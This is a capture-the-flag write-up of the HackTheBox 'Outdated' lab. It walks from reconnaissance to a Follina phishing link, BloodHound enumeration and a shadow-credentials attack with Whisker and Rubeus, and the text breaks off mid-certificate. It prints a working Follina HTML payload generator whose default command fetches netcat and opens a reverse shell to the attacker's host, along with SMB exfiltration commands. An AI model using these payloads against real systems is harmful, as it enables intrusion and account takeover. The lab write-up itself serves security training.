---
title: HTB: Outdated
url: https://0xdf.gitlab.io/2022/12/10/htb-outdated.html
date: 2022-12-10T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, hackthebox, htb-outdated, nmap, windows, domain-controller, crackmapexec, smbclient, cve-2022-30190, folina, swaks, phishing, hyper-v, bloodhound, addkeycredentiallink, shadow-credential, whisker, pywhisker, visual-studio, rubeus, sharp-collection, evil-winrm, wsus, sharpwsus, hive-nightmare, secretsdump, pkinittools, osep-like, oscp-plus-v3, cpts-like
---

![Outdated](https://0xdfimages.gitlab.io/img/outdated-cover.png)

Outdated has three steps that are all really interesting. First, I’ll exploit Folina by sending a link to an email address collected via recon over SMB. Then I’ll exploit shadow credentials to move laterally to the next user. Finally, I’ll exploit the Windows Server Update Services (WSUS) by pushing a malicious update to the DC and getting a shell as system. In Beyond Root, I’ll look at a couple steps involving Hive Nightmare that I was able to bypass.

## Box Info

| Name | [Outdated](https://hackthebox.com/machines/outdated)  [Outdated](https://hackthebox.com/machines/outdated) [Play on HackTheBox](https://hackthebox.com/machines/outdated) |
| --- | --- |
| Release Date | [13 Aug 2022](https://twitter.com/hackthebox_eu/status/1557381371089272833) |
| Retire Date | 10 Dec 2022 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Outdated |
| Radar Graph | Radar chart for Outdated |
| First Blood User | 00:17:09[guglia001 guglia001](https://app.hackthebox.com/users/112776) |
| First Blood Root | 00:16:33[guglia001 guglia001](https://app.hackthebox.com/users/112776) |
| Creator | [ctrlzero ctrlzero](https://app.hackthebox.com/users/168546) |

## Recon

### nmap

`nmap` finds 32 open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.175
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-21 22:35 UTC
Nmap scan report for dc.outdated.htb (10.10.11.175)
Host is up (0.089s latency).
Not shown: 65497 closed ports
PORT      STATE    SERVICE
25/tcp    open     smtp
53/tcp    open     domain
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
143/tcp   open     imap
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
587/tcp   open     submission
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
2179/tcp  open     vmrdp
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
5985/tcp  open     wsman
8530/tcp  open     unknown
8531/tcp  open     unknown
9389/tcp  open     adws
23088/tcp filtered unknown
26319/tcp filtered unknown
34206/tcp filtered unknown
43966/tcp filtered unknown
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49669/tcp open     unknown
49670/tcp open     unknown
49671/tcp open     unknown
49674/tcp open     unknown
49762/tcp filtered unknown
49890/tcp open     unknown
49919/tcp open     unknown
49932/tcp open     unknown
49936/tcp open     unknown
54471/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds

oxdf@hacky$ nmap -p 25,53,88,135,139,143,389,445,464,587,593,636,2179,3268,3269,5985,8530,8531,9389 -sCV 10.10.11.175
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-21 22:40 UTC
Nmap scan report for dc.outdated.htb (10.10.11.175)
Host is up (0.089s latency).

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-22 07:00:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  tcpwrapped
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-07-22T07:03:39+00:00; +8h20m04s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-07-22T07:03:38+00:00; +8h20m03s from scanner time.
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-07-22T07:03:40+00:00; +8h20m04s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-07-22T07:03:38+00:00; +8h20m03s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
8531/tcp open  unknown
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/21%Time=62D9D5F2%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h20m03s, deviation: 0s, median: 8h20m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-22T07:03:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.45 seconds

```

The combination of ports make it looks like a Windows Domain Controller, along with TCP 8530 and 8531, which are IIS ports (some Googling will show they are WSUS associated). Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is likely running Windows 10 / Server 2016 or later.

`nmap` also identified the hostname `mail.outdated.htb` on TCP 25 and `dc.outdated.htb` and `outdated.htb` on the TLS certificated on the LDAP ports (636, 3268, 3269). LDAP also shows the domain `outdated.htb`, which is consistent with the rest.

I’ll add a line to my local `/etc/hosts` file:

```
10.10.11.175 dc.outdated.htb mail.outdated.htb outdated.htb

```

Typically when I see subdomains in use like this, I’ll fuzz a webserver to see if the page changes under different `Host` headers. But in this case, I don’t really have a web server to fuzz.

### SMB - TCP 445

#### Auth

`crackmapexec` shows the OS as Windows 10:

```

oxdf@hacky$ crackmapexec smb 10.10.11.175 
SMB         10.10.11.175    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)

```

With a bad username / creds, it can list shares:

```

oxdf@hacky$ crackmapexec smb 10.10.11.175 -u '0xdf' -p '' --shares
SMB         10.10.11.175    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.175    445    DC               [+] outdated.htb\0xdf: 
SMB         10.10.11.175    445    DC               [+] Enumerated shares
SMB         10.10.11.175    445    DC               Share           Permissions     Remark
SMB         10.10.11.175    445    DC               -----           -----------     ------
SMB         10.10.11.175    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.175    445    DC               C$                              Default share
SMB         10.10.11.175    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.175    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.175    445    DC               Shares          READ            
SMB         10.10.11.175    445    DC               SYSVOL                          Logon server share 
SMB         10.10.11.175    445    DC               UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.10.11.175    445    DC               WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.10.11.175    445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.

```

`smbclient` can show that as well:

```

oxdf@hacky$ smbclient -L //10.10.11.175 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
        UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
SMB1 disabled -- no workgroup available

```

Many of these are default (`ADMIN$`, `C$`, and `IPC$`) or part of being a DC (`NETLOGON` and `SYSVOL`). I am able to connect to both the DC shares, but I can’t list files on them, so they aren’t of much use. The same behavior is true for the two WSUS-related shares (`WsusContent` and `WSUSTemp`). Windows Server Update Services (WSUS) is a system for distributing patches throughout a network.

`Shares` is custom, and I’ll want to look at that.

#### Shares

This share has only a single file:

```

oxdf@hacky$ smbclient -N //10.10.11.175/shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 20 15:01:33 2022
  ..                                  D        0  Mon Jun 20 15:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 15:00:32 2022

                10328314 blocks of size 4096. 2794617 blocks available

```

I’ll download it:

```

smb: \> get NOC_Reminder.pdf
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (184.2 KiloBytes/sec) (average 184.2 KiloBytes/sec)

```

#### PDF

The PDF has some important hints:

[![image-20220719155823386](https://0xdfimages.gitlab.io/img/image-20220719155823386.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220719155823386.png)

The first hint is that they are looking for people to send links to web applications to `itsupport@outdated.htb`. That’s useful, and suggests that someone will click on these links.

There’s also a list of CVEs:
- CVE-2022-30190 - This is the big MSDT (also known as Folina) vulnerability that came out at the end of May 2022. I’ll come back to this.
- CVE-2022-30129 - This vulnerability exploits VSCode. Lots of the information is based on [this demo](https://www.nu11secur1ty.com/2022/06/cve-2022-30129.html), which I think is trying to show RCE by opening a browser to PornHub. The actual issue is described well [here](https://github.com/microsoft/vscode/issues/149177), involves `vscode://` url. At the time of release, I can’t find any POCs and there’s no reason to think that VSCode is installed on the box.
- CVE-2022-30138 - Vulnerability in the Windows Print Spooler, but only local privilege escalation.
- CVE-2022-29130 - RCE in LDAP. At the time of release, I can’t find any POCs for this exploit.
- CVE-2022-29110 - RCE in Excel. At the time of release, I can’t find any POCs for this exploit, and there’s no indication that Excel is installed on the box.

## Shell as btables on client

### CVE-2022-30190 Background

When Folina first became public, [John Hammond](https://www.youtube.com/watch?v=dGCOhORNKRk) put out this really solid video explaining it. It’s possible to abuse the `msdt://` URL protocol to get code execution. The most common attack path is in an Office document that contains an external reference to an attacker controlled HTML file, and that HTML file contains JavaScript that redirects to a `msdt://` URL.

Typically this wouldn’t be an issue, as the Microsoft Diagnostic Tool would pop dialogs and require user input, but it seems that when the URL is longer than 4096 bytes, that is bypassed. This detail was actually missed when the researcher first submitted this bug to Microsoft, which led to the bug being rejected as not a bug, and extended the vulnerability window for many victims.

### Strategy

I’m going to send an email to the `itsupport@outdated.htb` email address noted in the note, with a link to a Folina exploit. Typically Folina is packaged in a word document to truly get around having pop ups, etc. To solve Outdated, I’ll need to use just an HTML page that uses JavaScript to redirect to the `msdt://` URL.

I really liked this box, but I think one of the reasons that this box didn’t score as high as I rated it is that there were some landmines here that make the next steps tricky. For one, based on some testing IppSec and I did in preparing this write-up / his video, it seems that the spam filter on the emails is catching certain emails, and then their links don’t get clicks. For example, if the URL in the email ends in `.doc`, it gets filtered. Beyond that, Word isn’t actually on the machine, so sending a link that points to a document would not lead to exploitation, but rather frustration.

### Generate Payload

Use some code based on [John Hammond’s POC](https://github.com/JohnHammond/msdt-follina). This POC does a lot of things, generating a Word document that will request the HTML payload, and even providing the webserver and catching the reverse shell. I’ll use just a couple lines that generate that HTML payload:

```

#!/usr/bin/env python3

import base64
import random
import string
import sys

if len(sys.argv) > 1:
    command = sys.argv[1]
else:
    command = "IWR http://10.10.14.6/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.14.6 443 -e cmd"

base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

# Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
html_payload += (
    "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
    + "\n</script>"
)

print(html_payload)

```

It’s important to note that the payload must be padded out to larger than 4096 bytes to bypass user activity.

I’ll generate this payload and save it into a file I’ll then serve with Python’s webserver.

### Trigger Exploit

I’ll send the link in an email to `itsupport@outdated.htb` using `swaks`:

```

oxdf@hacky$ swaks --to itsupport@outdated.htb --from "0xdf@0xdf.htb" --header "Subject: Internal web app" --body "http://10.10.14.6/msdt.html"
=== Trying outdated.htb:25...
=== Connected to outdated.htb.
<-  220 mail.outdated.htb ESMTP
 -> EHLO hacky
<-  250-mail.outdated.htb
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<0xdf@0xdf.htb>
<-  250 OK
 -> RCPT TO:<itsupport@outdated.htb>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Thu, 21 Jul 2022 23:08:59 +0000
 -> To: itsupport@outdated.htb
 -> From: 0xdf@0xdf.htb
 -> Subject: Internal web app
 -> Message-Id: <20220721230859.1554228@hacky>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> http://10.10.14.6/msdt.html
 -> 
 -> 
 -> .
<-  250 Queued (9.031 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

```

If this works, the user will click the link, requesting the `msdt.html` page, which I’ll serve, and moments later, I should get a request to upload `nc64.exe` (I’ll make sure there’s a copy in my web root) and then a shell on TCP 443. It works just like expected. Two get requests:

```
10.10.10.10 - - [19/Aug/2022 18:45:55] "GET /msdt.html HTTP/1.1" 200 -
10.10.10.10 - - [19/Aug/2022 18:45:56] "GET /nc64.exe HTTP/1.1" 200 -

```

Then a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.10 49804
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\btables\AppData\Local\Temp\SDIAG_b1b9b992-ddf0-4e8b-a9b9-555eab77e488>

```

I’ll run `powershell` to get out of `cmd` into PowerShell.

### Forensics Aside

When the user on Outdated visits the link, it does so using PowerShell. I can observe this by looking a the full request, catching it in `nc` or running Wireshark:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.175 49866
GET /msdt.html HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.906
Host: 10.10.14.6
Connection: Keep-Alive

```

The `User-Agent` string leaks the current version of the box. 5.1 is the PowerShell version, and 19041.906 is the build number for the version of Windows that’s running on Outdated. In this case, I [can see](https://support.microsoft.com/en-us/topic/march-29-2021-kb5000842-os-builds-19041-906-and-19042-906-preview-1a58a276-6a0a-47a5-aa7d-97af2d10b16d) it’s from March 29, 2021, well before Folina was patched in June 2022. Shout to IppSec for this observation.

## Shell as sflowers on DC

### Enumeration

#### Home Dirs

The shell is running as outdated\btables. There’s not much of anything in `\users\btables\`. Looking for other home directories, there’s only administrator:

```

PS C:\users> ls

    Directory: C:\users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/15/2022  10:45 AM                administrator
d-----         7/18/2022   2:53 PM                btables
d-r---         6/15/2022   9:23 AM                Public  

```

btables can’t access it.

#### Container

The hostname of the box is client:

```

PS C:\> hostname
client

```

The `ipconfig` shows an unexpected IP address:

```

PS C:\> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.20.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.20.1

```

That’s not the public IP I emailed. I must be in a container. `systeminfo` show that the box is a part of the `outdated.htb` domain:

```

PS C:\> systeminfo 

Host Name:                 CLIENT
OS Name:                   Microsoft Windows 10 Pro N
OS Version:                10.0.19043 N/A Build 19043
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          setup
Registered Organization:   
Product ID:                00331-60000-00000-AA694
Original Install Date:     6/15/2022, 9:20:38 AM
System Boot Time:          7/19/2022, 4:31:23 PM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              American Megatrends Inc. 090007 , 5/18/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,118 MB
Available Physical Memory: 699 MB
Virtual Memory: Max Size:  4,607 MB
Virtual Memory: Available: 2,822 MB
Virtual Memory: In Use:    1,785 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    outdated.htb
Logon Server:              \\DC
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB5000736
                           [03]: KB5001330
                           [04]: KB5001405
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.20.20
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

There are patches applied to the host, and the DC hostname is DC.

#### Bloodhound Collection

I’ll grab the latest copy of `SharpHound.exe` from the [Bloodhound repo](https://github.com/BloodHoundAD/BloodHound), place it in my web root, and upload it to Outdated, working out of `C:\programdata`:

```

PS C:\programdata> iwr http://10.10.14.6/SharpHound.exe -outfile s.exe

```

I’ll run it with `-C all` (for all collection methods):

```

PS C:\programdata> .\s.exe -C all
.\s.exe -C all
2022-07-19T20:34:56.1862643-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-07-19T20:34:56.1862643-07:00|INFORMATION|Initializing SharpHound at 8:34 PM on 7/19/2022
2022-07-19T20:34:56.6237628-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-07-19T20:34:56.8581431-07:00|INFORMATION|Beginning LDAP search for outdated.htb
2022-07-19T20:34:56.8895301-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-07-19T20:34:56.9050152-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-07-19T20:35:26.8931458-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
2022-07-19T20:35:45.2917806-07:00|INFORMATION|Consumers finished, closing output channel
2022-07-19T20:35:45.3386471-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-07-19T20:35:45.4948968-07:00|INFORMATION|Status: 97 objects finished (+97 2.020833)/s -- Using 59 MB RAM
2022-07-19T20:35:45.4948968-07:00|INFORMATION|Enumeration finished in 00:00:48.6515019
2022-07-19T20:35:45.6198986-07:00|INFORMATION|SharpHound Enumeration Completed at 8:35 PM on 7/19/2022! Happy Graphing!
PS C:\programdata> ls

    Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
...[snip]...
-a----         7/19/2022   8:35 PM          11477 20220719203544_BloodHound.zip
-a----         7/19/2022   8:35 PM           8753 MjdhMDc5MjItNDk4MS00NjFiLWFkY2ItZjQ0ZTBlODI3Mzhh.bin                 
-a----         7/19/2022   6:45 PM          45272 nc64.exe
-a----         7/19/2022   8:33 PM         908288 s.exe   

```

It generates a Zip archive with the results.

I’ll exfil it over SMB, first starting a share on my host:

```

oxdf@hacky$ smbserver.py -smb2support share . -user 0xdf -pass 0xdf0xdf
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Then mounting the share from the shell on client and copying the data onto it (and onto my machine):

```

PS C:\programdata> net use \\10.10.14.6\share /u:0xdf 0xdf0xdf
The command completed successfully.
PS C:\programdata> copy 20220719203544_BloodHound.zip \\10.10.14.6\share\

```

#### Bloodhound Analysis

I’ll open Bloodhound, clear the database, and upload the Zip file. I’ll search for btables and mark them as owned. Looking closer at btables, they have one “Group Delegated Object Control” under “Outbound Control Rights”:

![image-20220719165310209](https://0xdfimages.gitlab.io/img/image-20220719165310209.png)

Clicking on that puts it on the graph:

![image-20220719165328183](https://0xdfimages.gitlab.io/img/image-20220719165328183.png)

As a member of the ITSTAFF group, btables has `AddKeyCredentialLink` on sflowers. Unfortunately, at the time of writing, there’s no abuse info in Bloodhound associated with that link.

### Get sflowers NTLM

#### Shadow Credentials

[This post](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) by the Active Directory gurus at SpectorOps defines the idea of Shadow Credentials, and how to abuse key trust account mapping to take over an account. They also released a tool do carry out this abuse, [Whisker](https://github.com/eladshamir/Whisker).

The author of the box intended to have players go through a longer path to leak btables’ password and then use the Python implementation of Whisker, [pywhisker](https://github.com/ShutdownRepo/pywhisker). I’ll walk through that in [Beyond Root](#beyond-root---skipped-steps). For now, I’ll just use the Windows version running as btables on client.

#### Build Whisker

I’ll jump over to my Windows VM, and open Visual Studio 2022. At the open screen, I’ll select “Clone a repository”:

![image-20220719175855736](https://0xdfimages.gitlab.io/img/image-20220719175855736.png)

On the next Window, I’ll give it `https://github.com/eladshamir/Whisker` and click “Clone”.

The project is not open yet. In the “Solutions Explorer” on the right, I’ll double click on `Whisker.sln` to open it. Now I’ll set the Build option to Release and Any CPU, and hit Ctrl-Shift-B to build:

![image-20220719180107403](https://0xdfimages.gitlab.io/img/image-20220719180107403.png)

It builds:

```

Build started...
1>------ Build started: Project: Whisker, Configuration: Release Any CPU ------
1>  Whisker -> C:\Users\0xdf\Source\Repos\Whisker\Whisker\bin\Release\Whisker.exe
========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========

```

I’ll copy the resulting `Whisker.exe` back to my Linux VM.

#### Exploit Shadow Credential

I’ll upload `Whisker.exe` to Outdated using `iwr`:

```

PS C:\ProgramData> iwr http://10.10.14.6/Whisker.exe -outfile w.exe

```

I can run it to look for any current entries for sflowers. There are none:

```

PS C:\ProgramData> .\w.exe list /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb
.\w.exe list /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Listing deviced for sflowers:
[*] No entries!

```

I’ll add one:

```

PS C:\ProgramData> .\w.exe add /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb /password:0xdf0xdf
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 5cdd7103-25ea-444a-8a58-7dd254265116
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate: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